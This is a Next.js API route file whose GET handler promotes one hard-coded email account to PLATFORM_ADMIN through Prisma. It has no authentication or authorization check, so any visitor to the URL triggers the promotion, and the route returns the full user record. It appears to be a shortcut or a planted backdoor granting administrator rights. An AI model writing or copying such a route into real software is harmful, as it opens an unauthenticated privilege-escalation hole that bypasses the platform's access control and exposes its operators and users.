export const dynamic = 'force-dynamic';
import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export async function GET() {
  const user = await prisma.user.update({
    where: { email: "cicera@gmail.com" },
    data: { role: "PLATFORM_ADMIN" },
  });
  return NextResponse.json({ success: true, user });
}

